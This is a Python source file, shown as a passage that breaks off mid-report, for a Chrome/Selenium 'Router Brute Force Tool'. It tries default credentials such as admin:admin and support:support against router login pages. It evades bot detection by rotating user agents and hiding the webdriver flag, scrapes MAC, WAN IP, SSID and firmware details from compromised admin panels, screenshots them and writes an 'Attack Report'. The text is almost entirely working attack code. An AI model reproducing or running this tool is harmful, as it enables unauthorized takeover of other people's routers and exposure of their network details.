#!/usr/bin/env python3
"""
Router Brute Force Chrome - Chrome-based Router Brute Force Tool v2.0
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Chrome automation for router brute force attacks with screenshot capture
"""

import os
import sys
import json
import time
import signal
import random
import socket
import argparse
import threading
import re
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore')

# Chrome automation imports
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
    CHROME_AVAILABLE = True
except ImportError:
    CHROME_AVAILABLE = False
    print("Error: Selenium not installed. Please install: pip install selenium")
    sys.exit(1)

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'login_pages_found': 0, 'vulnerable_routers': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.GREEN}{Colors.BOLD}
    ██████╗  ██████╗ ██╗   ██╗████████╗███████╗██████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
    ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗   ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝
    ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██████╔╝   ██████╔╝██║   ██║██║   ██║   ██║   █████╗  
    ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗   ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  
    ██║  ██╗╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║   ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝
    
    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ██████╗ ██╗   ██╗██████╗ ████████╗███████╗
    ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝   ██╔═══██╗██║   ██║██╔══██╗╚══██╔══╝██╔════╝
    ██████╔╝██║   ██║██║   ██║   ██║   █████╗     ██║   ██║██║   ██║██████╔╝   ██║   █████╗  
    ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝     ██║   ██║██║   ██║██╔══██╗   ██║   ██╔══╝  
    ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗   ╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
    
    Chrome-based Router Brute Force Tool v2.0
    Author: Network Security Engineer
    Cross-platform: Windows, Linux, macOS
{Colors.END}
"""

# Target credentials - Only 4 combinations as requested
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

class ChromeRouterBruteForce:
    def __init__(self, login_urls, threads=1, timeout=10, headless=False, enable_screenshot=True):
        self.login_urls = list(set(login_urls))  # Remove duplicates
        self.threads = threads
        self.timeout = timeout
        self.headless = headless
        self.enable_screenshot = enable_screenshot
        self.lock = threading.Lock()
        
    def create_chrome_driver(self):
        """Create Chrome driver with optimized settings"""
        try:
            chrome_options = Options()
            
            # Always run in visible mode for user interaction
            # if self.headless:
            #     chrome_options.add_argument('--headless')
            
            # Cross-platform compatibility options
            if os.name == 'nt':  # Windows
                chrome_options.add_argument('--no-sandbox')
                chrome_options.add_argument('--disable-dev-shm-usage')
            else:  # Linux/macOS
                chrome_options.add_argument('--no-sandbox')
                chrome_options.add_argument('--disable-dev-shm-usage')
                chrome_options.add_argument('--disable-gpu')
            
            # Performance options
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Window size
            chrome_options.add_argument('--window-size=1920,1080')
            
            # Random User-Agent
            chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            # Try to create driver with auto-detection
            try:
                driver = webdriver.Chrome(options=chrome_options)
            except Exception as e:
                if "version" in str(e).lower() or "compatible" in str(e).lower():
                    print(f"{Colors.YELLOW}[!] ChromeDriver version mismatch detected. Attempting to download compatible version...{Colors.END}")
                    # Try to download compatible ChromeDriver
                    try:
                        import auto_chromedriver
                        if auto_chromedriver.main():
                            print(f"{Colors.GREEN}[+] Compatible ChromeDriver downloaded. Retrying...{Colors.END}")
                            driver = webdriver.Chrome(options=chrome_options)
                        else:
                            raise Exception("Failed to download compatible ChromeDriver")
                    except ImportError:
                        print(f"{Colors.RED}[!] Auto ChromeDriver downloader not available. Please run: python auto_chromedriver.py{Colors.END}")
                        raise e
                else:
                    raise e
            
            # Execute script to remove webdriver property
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return driver
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error creating Chrome driver: {e}{Colors.END}")
            return None
    
    def detect_login_form(self, driver):
        """Detect login form fields on the page with better element detection"""
        try:
            # Wait for page to load
            time.sleep(2)
            
            # Common field name patterns
            username_fields = [
                'username', 'user', 'login', 'admin', 'name', 'email', 'account',
                'userid', 'user_id', 'loginname', 'login_name', 'uname', 'u_name',
                'usr', 'usrnm', 'un', 'u', 'loginid', 'login_id', 'lgn', 'lgnid'
            ]
            
            password_fields = [
                'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key',
                'passphrase', 'pword', 'p_word', 'loginpass', 'login_pass',
                'pswd', 'psw', 'psswrd', 'psswd', 'passw0rd', 'passwrd'
            ]
            
            username_field = None
            password_field = None
            
            # Try to find username field with multiple strategies
            for field_name in username_fields:
                try:
                    field = driver.find_element(By.NAME, field_name)
                    if field.is_displayed() and field.is_enabled():
                        username_field = field
                        break
                except NoSuchElementException:
                    try:
                        field = driver.find_element(By.ID, field_name)
                        if field.is_displayed() and field.is_enabled():
                            username_field = field
                            break
                    except NoSuchElementException:
                        try:
                            field = driver.find_element(By.XPATH, f"//input[@placeholder='{field_name}']")
                            if field.is_displayed() and field.is_enabled():
                                username_field = field
                                break
                        except NoSuchElementException:
                            continue
            
            # Try to find password field with multiple strategies
            for field_name in password_fields:
                try:
                    field = driver.find_element(By.NAME, field_name)
                    if field.is_displayed() and field.is_enabled():
                        password_field = field
                        break
                except NoSuchElementException:
                    try:
                        field = driver.find_element(By.ID, field_name)
                        if field.is_displayed() and field.is_enabled():
                            password_field = field
                            break
                    except NoSuchElementException:
                        try:
                            field = driver.find_element(By.XPATH, f"//input[@placeholder='{field_name}']")
                            if field.is_displayed() and field.is_enabled():
                                password_field = field
                                break
                        except NoSuchElementException:
                            continue
            
            # If not found by name/id, try by type
            if not username_field:
                try:
                    username_field = driver.find_element(By.CSS_SELECTOR, 'input[type="text"], input[type="email"], input[type="tel"], input[type="number"]')
                except NoSuchElementException:
                    pass
            
            if not password_field:
                try:
                    password_field = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                except NoSuchElementException:
                    pass
            
            # If still not found, try JavaScript approach
            if not username_field or not password_field:
                try:
                    # Use JavaScript to find and make elements interactable
                    script = """
                    var usernameField = null;
                    var passwordField = null;
                    
                    // Find username field
                    var inputs = document.querySelectorAll('input');
                    for (var i = 0; i < inputs.length; i++) {
                        var input = inputs[i];
                        var name = (input.name || '').toLowerCase();
                        var id = (input.id || '').toLowerCase();
                        var type = (input.type || '').toLowerCase();
                        
                        if (type === 'text' || type === 'email' || type === 'tel' || type === 'number') {
                            if (name.includes('user') || name.includes('login') || name.includes('email') || 
                                id.includes('user') || id.includes('login') || id.includes('email')) {
                                usernameField = input;
                                break;
                            }
                        }
                    }
                    
                    // Find password field
                    for (var i = 0; i < inputs.length; i++) {
                        var input = inputs[i];
                        var type = (input.type || '').toLowerCase();
                        
                        if (type === 'password') {
                            passwordField = input;
                            break;
                        }
                    }
                    
                    // Make elements interactable
                    if (usernameField) {
                        usernameField.style.display = 'block';
                        usernameField.style.visibility = 'visible';
                        usernameField.removeAttribute('disabled');
                        usernameField.removeAttribute('readonly');
                    }
                    
                    if (passwordField) {
                        passwordField.style.display = 'block';
                        passwordField.style.visibility = 'visible';
                        passwordField.removeAttribute('disabled');
                        passwordField.removeAttribute('readonly');
                    }
                    
                    return {
                        username: usernameField ? 'found' : 'not found',
                        password: passwordField ? 'found' : 'not found'
                    };
                    """
                    
                    result = driver.execute_script(script)
                    print(f"{Colors.BLUE}[*] JavaScript form detection: {result}{Colors.END}")
                    
                    # Try to find elements again after JavaScript modification
                    if not username_field:
                        try:
                            username_field = driver.find_element(By.CSS_SELECTOR, 'input[type="text"], input[type="email"]')
                        except NoSuchElementException:
                            pass
                    
                    if not password_field:
                        try:
                            password_field = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                        except NoSuchElementException:
                            pass
                            
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] JavaScript form detection failed: {e}{Colors.END}")
            
            return username_field, password_field
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error detecting login form: {e}{Colors.END}")
            return None, None
    
    def find_submit_button(self, driver):
        """Find submit button for login form"""
        try:
            # Common submit button selectors
            submit_selectors = [
                "//input[@type='submit']",
                "//button[@type='submit']",
                "//input[@value='Login']",
                "//button[contains(text(), 'Login')]",
                "//input[@value='Sign In']",
                "//button[contains(text(), 'Sign In')]",
                "//input[@value='Submit']",
                "//button[contains(text(), 'Submit')]",
                "//input[@value='Enter']",
                "//button[contains(text(), 'Enter')]",
                "//input[@value='OK']",
                "//button[contains(text(), 'OK')]",
                "//button[contains(@class, 'login')]",
                "//button[contains(@class, 'submit')]",
                "//input[contains(@class, 'login')]",
                "//input[contains(@class, 'submit')]"
            ]
            
            for selector in submit_selectors:
                try:
                    button = driver.find_element(By.XPATH, selector)
                    return button
                except NoSuchElementException:
                    continue
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
            return None
    
    def detect_authentication_type(self, driver, url):
        """Detect authentication type using Chrome"""
        try:
            page_source = driver.page_source.lower()
            current_url = driver.current_url.lower()
            page_title = driver.title.lower()
            
            # 1. HTTP Basic Authentication - Check for 401 response
            try:
                # Check if we get a 401 Unauthorized response
                if 'unauthorized' in page_source or '401' in page_source:
                    return 'http_basic'
                
                # Check for basic auth prompt
                if 'authentication required' in page_source or 'enter username and password' in page_source:
                    return 'http_basic'
                
                # Check if URL shows basic auth prompt
                if '://' in url and '@' not in url and ('login' in current_url or 'auth' in current_url):
                    # Try to access the URL and see if we get basic auth
                    try:
                        response = driver.execute_script("return fetch(arguments[0], {method: 'GET'}).then(r => r.status)", url)
                        if response == 401:
                            return 'http_basic'
                    except:
                        pass
            except:
                pass
            
            # 2. Form-based Authentication (most common)
            if '<form' in page_source and ('password' in page_source or 'passwd' in page_source):
                return 'form_based'
            
            # 3. JavaScript-based Authentication
            if 'javascript' in page_source and ('login' in page_source or 'auth' in page_source):
                return 'javascript_based'
            
            # 4. API-based Authentication
            if any(keyword in page_source for keyword in ['api', 'json', 'ajax', 'xmlhttprequest']):
                return 'api_based'
            
            # 5. Cookie-based Authentication
            if any(keyword in page_source for keyword in ['cookie', 'session', 'token', 'csrf']):
                return 'cookie_based'
            
            # 6. Redirect-based Authentication
            if driver.execute_script("return window.location.href") != url:
                return 'redirect_based'
            
            # 7. Check for empty page or basic auth prompt
            if len(page_source) < 1000 and ('login' in current_url or 'auth' in current_url):
                return 'http_basic'
            
            # Default to form-based
            return 'form_based'
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error detecting auth type: {e}{Colors.END}")
            return 'form_based'
    
    def handle_http_basic_auth(self, driver, url, username, password):
        """Handle HTTP Basic Authentication"""
        try:
            # For HTTP Basic Auth, we need to include credentials in URL
            from urllib.parse import urlparse
            parsed_url = urlparse(url)
            auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
            driver.get(auth_url)
            time.sleep(3)
            return True, driver.current_url
        except Exception as e:
            print(f"{Colors.YELLOW}[-] HTTP Basic Auth failed: {e}{Colors.END}")
            return False, None
    
    def handle_form_based_auth(self, driver, username, password):
        """Handle form-based authentication with alert handling"""
        try:
            # Detect login form
            username_field, password_field = self.detect_login_form(driver)
            
            if not username_field or not password_field:
                return False, None
            
            # Fill login form
            try:
                username_field.clear()
                username_field.send_keys(username)
                time.sleep(0.5)
                
                password_field.clear()
                password_field.send_keys(password)
                time.sleep(0.5)
            except Exception as e:
                print(f"{Colors.YELLOW}[-] Error filling form fields: {e}{Colors.END}")
                return False, None
            
            # Find and click submit button
            try:
                submit_button = self.find_submit_button(driver)
                if submit_button:
                    submit_button.click()
                else:
                    # Try pressing Enter on password field
                    password_field.send_keys("\n")
            except Exception as e:
                print(f"{Colors.YELLOW}[-] Error clicking submit: {e}{Colors.END}")
                return False, None
            
            # Wait for page to load after login
            time.sleep(3)
            
            # Handle alerts (login failed messages)
            try:
                alert = driver.switch_to.alert
                alert_text = alert.text
                print(f"{Colors.YELLOW}[-] Alert detected: {alert_text}{Colors.END}")
                alert.accept()  # Accept the alert
                time.sleep(1)
                return False, None  # Login failed
            except:
                # No alert, continue
                pass
            
            return True, driver.current_url
            
        except Exception as e:
            print(f"{Colors.YELLOW}[-] Form-based auth failed: {e}{Colors.END}")
            return False, None
    
    def handle_javascript_auth(self, driver, username, password):
        """Handle JavaScript-based authentication"""
        try:
            # Try to execute JavaScript for login
            script = f"""
            var usernameField = document.querySelector('input[name="username"], input[name="user"], input[name="login"], input[type="text"]');
            var passwordField = document.querySelector('input[name="password"], input[name="pass"], input[name="passwd"], input[type="password"]');
            
            if (usernameField && passwordField) {{
                usernameField.value = '{username}';
                passwordField.value = '{password}';
                
                // Try to find and click submit button
                var submitButton = document.querySelector('input[type="submit"], button[type="submit"], button:contains("Login"), button:contains("Sign In")');
                if (submitButton) {{
                    submitButton.click();
                }} else {{
                    // Try form submit
                    var form = usernameField.closest('form');
                    if (form) {{
                        form.submit();
                    }}
                }}
                return true;
            }}
            return false;
            """
            
            result = driver.execute_script(script)
            if result:
                time.sleep(5)
                return True, driver.current_url
            else:
                return False, None
                
        except Exception as e:
            print(f"{Colors.YELLOW}[-] JavaScript auth failed: {e}{Colors.END}")
            return False, None
    
    def is_login_successful(self, driver, initial_url, initial_title):
        """Check if login was successful"""
        try:
            current_url = driver.current_url
            current_title = driver.title
            page_source = driver.page_source.lower()
            
            # Check for success indicators
            success_indicators = [
                'dashboard', 'admin', 'control panel', 'configuration', 'settings',
                'system', 'status', 'network', 'router', 'gateway', 'modem',
                'welcome', 'main menu', 'logout', 'log out', 'management',
                'device status', 'system information', 'firmware', 'wan', 'lan'
            ]
            
            # Check for failure indicators
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong',
                'login failed', 'authentication failed', 'access denied',
                'username', 'password', 'enter credentials', 'sign in',
                'login', 'authentication', 'please login'
            ]
            
            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
            failure_count = sum(1 for indicator in failure_indicators if indicator in page_source)
            
            # Check if URL changed (good sign)
            url_changed = current_url != initial_url
            
            # Check if we're still on login page
            still_on_login = any(login_word in current_url.lower() for login_word in ['login', 'signin', 'auth', 'authentication'])
            
            # Check for admin panel specific indicators
            admin_indicators = ['admin panel', 'router management', 'device management', 'network management']
            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
            
            # Determine if login was successful
            if (success_count > failure_count and success_count >= 2) or (url_changed and not still_on_login) or admin_count >= 1:
                return True, current_url
            else:
                return False, None
                
        except Exception as e:
            print(f"{Colors.YELLOW}[-] Error checking login success: {e}{Colors.END}")
            return False, None

    def test_credentials_with_chrome(self, url, username, password):
        """Test credentials using Chrome automation with multiple auth types"""
        driver = None
        try:
            print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
            
            # Create Chrome driver
            driver = self.create_chrome_driver()
            if not driver:
                return False, None, None
            
            # Navigate to URL
            driver.get(url)
            time.sleep(3)  # Wait for page to load
            
            # Get initial page info
            initial_url = driver.current_url
            initial_title = driver.title
            
            # Detect authentication type
            auth_type = self.detect_authentication_type(driver, url)
            print(f"{Colors.BLUE}[*] Detected auth type: {auth_type}{Colors.END}")
            
            # Handle different authentication types
            success = False
            final_url = None
            
            if auth_type == 'http_basic':
                success, final_url = self.handle_http_basic_auth(driver, url, username, password)
            elif auth_type == 'form_based':
                success, final_url = self.handle_form_based_auth(driver, username, password)
            elif auth_type == 'javascript_based':
                success, final_url = self.handle_javascript_auth(driver, username, password)
            else:
                # Try form-based as fallback
                success, final_url = self.handle_form_based_auth(driver, username, password)
            
            if success:
                # Check if login was actually successful
                login_success, admin_url = self.is_login_successful(driver, initial_url, initial_title)
                if login_success:
                    print(f"{Colors.GREEN}[+] Login successful!{Colors.END}")
                    return True, admin_url, driver
                else:
                    print(f"{Colors.YELLOW}[-] Login failed - not in admin panel{Colors.END}")
                    return False, None, None
            else:
                print(f"{Colors.YELLOW}[-] Login failed{Colors.END}")
                return False, None, None
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error testing credentials: {e}{Colors.END}")
            return False, None, None
        finally:
            if driver and not success:
                driver.quit()
    
    def take_screenshot(self, driver, url, username, password, ip_address):
        """Take screenshot of admin panel"""
        try:
            # Take screenshot with IP in filename
            ip_clean = ip_address.replace('.', '_').replace(':', '_')
            screenshot_filename = f"screenshot_{ip_clean}_{username}_{password}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            driver.save_screenshot(screenshot_filename)
            
            print(f"{Colors.GREEN}[+] Screenshot saved: {screenshot_filename}{Colors.END}")
            return screenshot_filename
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Screenshot failed: {e}{Colors.END}")
            return None
    
    def extract_router_info(self, driver):
        """Extract router information from admin panel"""
        info = {}
        
        try:
            # Get page title
            info['page_title'] = driver.title
            
            # Get current URL
            info['current_url'] = driver.current_url
            
            # Get page source for text extraction
            page_source = driver.page_source
            
            # Extract MAC address
            mac_patterns = [
                r'mac[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
                r'([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
                r'physical.*?address[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})'
            ]
            
            for pattern in mac_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['mac_address'] = match.group(1)
                    break
            
            # Extract firmware version
            firmware_patterns = [
                r'firmware[^:]*:?\s*([v\d\.\-]+)',
                r'version[^:]*:?\s*([v\d\.\-]+)',
                r'firmware.*?(\d+\.\d+\.\d+)',
                r'software[^:]*:?\s*([v\d\.\-]+)'
            ]
            
            for pattern in firmware_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['firmware_version'] = match.group(1)
                    break
            
            # Extract model
            model_patterns = [
                r'model[^:]*:?\s*([A-Z0-9\-_]+)',
                r'device[^:]*:?\s*([A-Z0-9\-_]+)',
                r'product[^:]*:?\s*([A-Z0-9\-_]+)',
                r'type[^:]*:?\s*([A-Z0-9\-_]+)'
            ]
            
            for pattern in model_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['model'] = match.group(1)
                    break
            
            # Extract WAN IP
            wan_ip_patterns = [
                r'wan.*?(\d+\.\d+\.\d+\.\d+)',
                r'external.*?(\d+\.\d+\.\d+\.\d+)',
                r'internet.*?(\d+\.\d+\.\d+\.\d+)',
                r'public.*?(\d+\.\d+\.\d+\.\d+)'
            ]
            
            for pattern in wan_ip_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['wan_ip'] = match.group(1)
                    break
            
            # Extract SSID
            ssid_patterns = [
                r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'wifi.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
            ]
            
            for pattern in ssid_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['ssid'] = match.group(1)
                    break
            
            return info
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error extracting router info: {e}{Colors.END}")
            return {}
    
    def brute_force_single_url(self, login_url):
        """Brute force a single login URL using Chrome"""
        result = {'url': login_url, 'vulnerabilities': []}
        
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] CHROME BRUTE FORCING: {login_url}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Parse URL to get IP
            parsed_url = urlparse(login_url)
            ip = parsed_url.hostname
            
            # Test each credential combination
            vulnerability_found = False
            
            for username, password in TARGET_CREDENTIALS:
                if not running or vulnerability_found:
                    break
                
                # Test credentials with Chrome
                success, admin_url, driver = self.test_credentials_with_chrome(login_url, username, password)
                
                if success and driver:
                    print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
                    print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                    print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                    
                    # Extract router information
                    router_info = self.extract_router_info(driver)
                    
                    # Display extracted information
                    if router_info:
                        print(f"{Colors.YELLOW}[*] Router Information:{Colors.END}")
                        for key, value in router_info.items():
                            if value and value != "Unknown":
                                print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
                    
                    # Take screenshot
                    screenshot_file = None
                    if self.enable_screenshot:
                        print(f"{Colors.CYAN}[*] Taking screenshot...{Colors.END}")
                        screenshot_file = self.take_screenshot(driver, admin_url, username, password, ip)
                    
                    # Create vulnerability record
                    vulnerability = {
                        'type': 'Default Credentials',
                        'credentials': f"{username}:{password}",
                        'admin_url': admin_url,
                        'router_info': router_info,
                        'verified': True,
                        'screenshot': screenshot_file
                    }
                    result['vulnerabilities'].append(vulnerability)
                    
                    with self.lock:
                        stats['vulnerable_routers'] += 1
                    
                    vulnerability_found = True
                    break
                else:
                    print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
            
            if not vulnerability_found:
                print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
            
            # Update stats
            with self.lock:
                stats['targets_scanned'] += 1
                stats['login_pages_found'] += 1
            
            print(f"{Colors.GREEN}[+] URL {login_url} brute force completed{Colors.END}")
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error brute forcing {login_url}: {e}{Colors.END}")
            return result
    
    def generate_html_report(self, results):
        """Generate HTML report with screenshots"""
        try:
            html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Brute Force Chrome v2.0 - Attack Report</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }}
        .summary {{
            padding: 30px;
            background: #f8f9fa;
            border-bottom: 1px solid #dee2e6;
        }}
        .summary-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }}
        .summary-card {{
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .summary-card h3 {{
            margin: 0 0 10px 0;
            color: #2c3e50;
        }}
        .summary-card .number {{
            font-size: 2em;
            font-weight: bold;
            color: #e74c3c;
        }}
        .results {{
            padding: 30px;
        }}
        .target {{
            margin-bottom: 30px;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            overflow: hidden;
            background: white;
        }}
        .target-header {{
            background: #f8f9fa;
            padding: 15px 20px;
            font-weight: bold;
            color: #2c3e50;
            border-bottom: 1px solid #dee2e6;
        }}
        .target-content {{
            padding: 20px;
        }}
        .vulnerable {{
            border-left: 5px solid #e74c3c;
        }}
        .safe {{
            border-left: 5px solid #27ae60;
        }}
        .vulnerability {{
            background: #fff5f5;
            border: 1px solid #fed7d7;
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
        }}
        .vulnerability h4 {{
            color: #e53e3e;
            margin: 0 0 10px 0;
        }}
        .screenshot {{
            margin-top: 15px;
            text-align: center;
        }}
        .screenshot img {{
            max-width: 100%;
            height: auto;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }}
        .info-item {{
            background: #f8f9fa;
            padding: 10px 15px;
            border-radius: 5px;
            border-left: 3px solid #3498db;
        }}
        .info-item strong {{
            color: #2c3e50;
        }}
        .footer {{
            background: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Router Brute Force Chrome v2.0</h1>
            <p>Chrome-based Router Brute Force Attack Report</p>
        </div>
        
        <div class="summary">
            <h2>📊 Attack Summary</h2>
            <div class="summary-grid">
                <div class="summary-card">
                    <h3>URLs Tested</h3>
                    <div class="number">{len(results)}</div>
                </div>
                <div class="summary-card">
                    <h3>Login Pages Found</h3>
                    <div class="number">{stats['login_pages_found']}</div>
                </div>
                <div class="summary-card">
                    <h3>Vulnerable Routers</h3>
                    <div class="number">{stats['vulnerable_routers']}</div>
                </div>
                <div class="summary-card">
                    <h3>Attack Duration</h3>
                    <div class="number">{time.time() - stats['start_time']:.1f}s</div>
                </div>
            </div>
        </div>
        
        <div class="results">
            <h2>🎯 Detailed Results</h2>
"""
            
            for result in results:
                has_vulnerabilities = len(result['vulnerabilities']) > 0
                target_class = 'vulnerable' if has_vulnerabilities else 'safe'
                
                html_content += f"""
            <div class="target {target_class}">
                <div class="target-header">
                    🎯 URL: {result['url']}
                    {'🔒 VULNERABLE' if has_vulnerabilities else '✅ SECURE'}
                </div>
                <div class="target-content">
                    <div class="info-grid">
                        <div class="info-item">
                            <strong>URL:</strong> {result['url']}
                        </div>
                        <div class="info-item">
